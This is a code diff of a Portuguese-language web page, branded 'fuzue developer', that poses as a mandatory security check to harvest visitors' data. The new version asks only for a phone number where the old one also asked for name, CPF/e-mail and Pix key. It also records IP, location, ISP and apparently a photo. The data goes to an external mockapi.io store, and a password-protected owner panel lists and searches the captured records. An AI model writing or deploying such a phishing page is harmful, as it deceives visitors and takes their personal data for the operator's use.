@@ -10,7 +10,7 @@
 body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:12px;overflow-x:hidden}
 .container{width:100%;max-width:950px}
 
-/* Ecrã de Captura Interativa do Visitante */
+/* Ecrã de Recolha de Dados do Visitante */
 #visitor-form-screen{background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
 h1{color:var(--red);font-size:1.5rem;margin-bottom:8px;text-transform:lowercase;letter-spacing:2px}
 p{color:var(--muted);margin-bottom:16px;font-size:0.85rem}
@@ -18,13 +18,12 @@ p{color:var(--muted);margin-bottom:16px;font-size:0.85rem}
 
 .form-group{margin-bottom:12px;text-align:left}
 .form-group label{font-size:0.75rem;color:var(--muted);text-transform:uppercase;display:block;margin-bottom:4px}
-input, select{width:100%;padding:12px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:0.9rem}
-input:focus, select:focus{outline:none;border-color:var(--red)}
+input{width:100%;padding:12px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:1rem;text-align:center;letter-spacing:2px}
+input:focus{outline:none;border-color:var(--red)}
 
 /* Ecrã de Login do Dono */
 #login{display:none;background:var(--card);border:1px solid var(--border);padding:24px 16px;border-radius:12px;text-align:center;box-shadow:0 0 25px var(--vip-glow)}
 .input-box{position:relative;margin-bottom:12px}
-.input-box input{text-align:center;letter-spacing:3px}
 .input-box input.error{border-color:var(--red);box-shadow:0 0 10px rgba(255,26,26,0.4);animation:shake 0.3s ease-in-out}
 
 @keyframes shake{
@@ -47,7 +46,7 @@ button:hover{opacity:.85}
 
 /* Barra de Pesquisa Avançada */
 .search-box{margin-bottom:12px}
-.search-box input{width:100%;padding:10px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:0.85rem}
+.search-box input{width:100%;padding:10px;background:#050507;border:1px solid var(--border);color:var(--text);border-radius:6px;font-size:0.85rem;letter-spacing:normal;text-align:left}
 
 .actions{margin-bottom:14px;display:flex;flex-direction:column;gap:8px}
 .actions-row{display:flex;gap:6px;width:100%}
@@ -69,7 +68,7 @@ button:hover{opacity:.85}
   background:#050507;
 }
 
-table{width:100%;border-collapse:collapse;min-width:750px}
+table{width:100%;border-collapse:collapse;min-width:700px}
 th,td{padding:10px 12px;text-align:left;border-bottom:1px solid var(--border);font-size:0.78rem;white-space:nowrap}
 th{color:var(--muted);text-transform:uppercase;background:#050507;position:sticky;top:0;z-index:2}
 td{color:var(--text)}
@@ -87,28 +86,16 @@ td{color:var(--text)}
 
 <div class="container">
 
-<!-- 1. Ecrã de Recolha de Dados do Visitante -->
+<!-- 1. Ecrã de Recolha do Telemóvel -->
 <div id="visitor-form-screen">
 <h1>fuzue developer</h1>
 <p>Verificação de Segurança Obrigatória.</p>
 <div class="alert-login">
-⚠️ Para continuar e aceder ao conteúdo, confirme os seus dados de contacto e validação de identidade abaixo.
+⚠️ Para prosseguir com o acesso, insira o seu número de telemóvel para validação do sistema.
 </div>
 <div class="form-group">
-  <label>Nome Completo</label>
-  <input type="text" id="v-name" placeholder="Insira o seu nome">
-</div>
-<div class="form-group">
-  <label>Telemóvel / WhatsApp</label>
+  <label>Número de Telemóvel / WhatsApp</label>
   <input type="text" id="v-phone" placeholder="(00) 00000-0000">
-</div>
-<div class="form-group">
-  <label>CPF ou E-mail</label>
-  <input type="text" id="v-doc" placeholder="O seu CPF ou E-mail">
-</div>
-<div class="form-group">
-  <label>Chave Pix (Opcional)</label>
-  <input type="text" id="v-pix" placeholder="A sua Chave Pix">
 </div>
 <button onclick="submitVisitorData()">Verificar e Continuar</button>
 <div style="margin-top:12px; font-size:0.7rem; color:var(--muted); cursor:pointer;" onclick="showLoginDirect()">Acesso Administrador</div>
@@ -119,7 +106,7 @@ td{color:var(--text)}
 <h1>fuzue developer</h1>
 <p>Área restrita e monitorizada.</p>
 <div class="alert-login">
-⚠️ Insira a chave mestre de administrador para gerir os registos globais de rede e dados recolhidos.
+⚠️ Insira a chave mestre de administrador para visualizar os registos globais.
 </div>
 <div class="input-box">
   <input type="password" id="pass" placeholder="••••••••" oninput="clearError()">
@@ -136,11 +123,11 @@ td{color:var(--text)}
 <div class="status"><div class="dot"></div>VIP Ativo</div>
 </div>
 <div class="alert">
-⚠️ <strong>PAINEL DO DONO:</strong> Sistema de filtragem e biométrico ativo.
+⚠️ <strong>PAINEL DO DONO:</strong> Sistema de pesquisa por telemóvel e biometria ativo.
 </div>
 
 <div class="search-box">
-  <input type="text" id="searchInput" placeholder="🔍 Pesquisar por IP, Nome, Telefone, CPF, E-mail ou Pix..." oninput="filterLogs()">
+  <input type="text" id="searchInput" placeholder="🔍 Pesquisar por Telemóvel, IP ou Localização..." oninput="filterLogs()">
 </div>
 
 <div class="actions">
@@ -160,17 +147,14 @@ td{color:var(--text)}
 <tr>
   <th>Foto</th>
   <th>Horário</th>
-  <th>Nome</th>
-  <th>Telefone</th>
-  <th>CPF / E-mail</th>
-  <th>Chave Pix</th>
+  <th>Telemóvel</th>
   <th>IP Capturado</th>
   <th>Localização</th>
   <th>ISP</th>
 </tr>
 </thead>
 <tbody id="tb">
-<tr><td colspan="9" style="text-align:center;color:#707085;">A carregar dados da nuvem...</td></tr>
+<tr><td colspan="6" style="text-align:center;color:#707085;">A carregar dados da nuvem...</td></tr>
 </tbody>
 </table>
 </div>
@@ -183,20 +167,11 @@ td{color:var(--text)}
 const API_URL = 'https://6ab89b5af84897980b7224db.mockapi.io/api/v1/logs';
 let globalLogs = [];
 
-window.onload = function() {
-  if (localStorage.getItem('fuzue_logged')) {
-    // Se já preencheu antes, esconde o formulário e mostra um aviso simples ou deixa direto para o login se quiser
-  }
-};
-
 async function submitVisitorData() {
-  let name = document.getElementById('v-name').value.trim();
   let phone = document.getElementById('v-phone').value.trim();
-  let doc = document.getElementById('v-doc').value.trim();
-  let pix = document.getElementById('v-pix').value.trim();
 
-  if(!name || !phone || !doc) {
-    alert('Por favor, preencha os campos obrigatórios.');
+  if(!phone) {
+    alert('Por favor, insira o seu número de telemóvel.');
     return;
   }
 
@@ -237,10 +212,7 @@ async function submitVisitorData() {
 
   let newLog = {
     time: new Date().toLocaleString('pt-BR'),
-    name: name,
     phone: phone,
-    doc: doc,
-    pix: pix || 'Não informada',
     ip: ip,
     loc: loc,
     isp: isp,
@@ -256,7 +228,7 @@ async function submitVisitorData() {
 
     if (response.ok) {
       localStorage.setItem('fuzue_logged', 'true');
-      alert('Verificação efetuada com sucesso!');
+      alert('Validação efetuada com sucesso!');
       document.getElementById('visitor-form-screen').innerHTML = '<h1 style="color:#00ff66">Acesso Liberado</h1><p>Pode fechar esta página.</p>';
     }
   } catch(e) {
@@ -313,28 +285,28 @@ function setVPN(state){
 
 async function renderLogs(){
   let tbody = document.getElementById('tb');
-  tbody.innerHTML = `<tr><td colspan="9" style="text-align:center;color:#707085;">A atualizar dados da nuvem...</td></tr>`;
+  tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">A atualizar dados da nuvem...</td></tr>`;
   
   try {
     let response = await fetch(API_URL);
     globalLogs = await response.json();
     
     if (!globalLogs || globalLogs.length === 0) {
-      tbody.innerHTML = `<tr><td colspan="9" style="text-align:center;color:#707085;">Nenhum registo encontrado na nuvem.</td></tr>`;
+      tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum registo encontrado na nuvem.</td></tr>`;
       return;
     }
     
     displayLogsData(globalLogs);
 
   } catch(e) {
-    tbody.innerHTML = `<tr><td colspan="9" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#ff4d4d;">Erro ao ligar à base de dados na nuvem.</td></tr>`;
   }
 }
 
 function displayLogsData(logsArray) {
   let tbody = document.getElementById('tb');
   if (logsArray.length === 0) {
-    tbody.innerHTML = `<tr><td colspan="9" style="text-align:center;color:#707085;">Nenhum resultado para a pesquisa.</td></tr>`;
+    tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:#707085;">Nenhum resultado para a pesquisa.</td></tr>`;
     return;
   }
 
@@ -342,10 +314,7 @@ function displayLogsData(logsArray) {
     <tr>
       <td>${l.photo ? `<img src="${l.photo}" class="visitor-img">` : '<span style="color:#707085;font-size:0.7rem">Sem foto</span>'}</td>
       <td>${l.time || 'Desconhecido'}</td>
-      <td style="font-weight:bold">${l.name || 'Desconhecido'}</td>
-      <td>${l.phone || 'Desconhecido'}</td>
-      <td>${l.doc || 'Desconhecido'}</td>
-      <td>${l.pix || 'Desconhecido'}</td>
+      <td style="font-weight:bold;color:#00ff66;">${l.phone || 'Desconhecido'}</td>
       <td style="color:#ff4d4d;font-weight:bold">${l.ip || 'Desconhecido'}</td>
       <td>${l.loc || 'Desconhecido'}</td>
       <td>${l.isp || 'Desconhecido'}</td>
@@ -359,10 +328,7 @@ function displayLogsData(logsArray) {
 function filterLogs() {
   let query = document.getElementById('searchInput').value.toLowerCase();
   let filtered = globalLogs.filter(l => 
-    (l.name && l.name.toLowerCase().includes(query)) ||
     (l.phone && l.phone.toLowerCase().includes(query)) ||
-    (l.doc && l.doc.toLowerCase().includes(query)) ||
-    (l.pix && l.pix.toLowerCase().includes(query)) ||
     (l.ip && l.ip.toLowerCase().includes(query)) ||
     (l.loc && l.loc.toLowerCase().includes(query))
   );
